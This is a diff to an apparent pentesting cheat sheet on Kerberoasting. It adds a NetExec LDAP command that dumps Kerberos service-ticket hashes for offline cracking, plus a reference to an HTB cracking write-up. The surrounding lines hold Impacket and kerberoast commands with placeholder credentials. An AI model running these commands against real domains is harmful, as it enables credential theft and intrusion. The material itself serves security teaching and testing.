@@ -46,6 +46,9 @@ GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER>
 # Target a specific user’s SPNs only (reduce noise)
 GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>
 
+# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
+netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes
+
 # kerberoast by @skelsec (enumerate and roast)
 # 1) Enumerate kerberoastable users via LDAP
 kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
@@ -282,6 +285,7 @@ Additional ideas:
 
 ## References
 
+- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
 - [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
 - [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
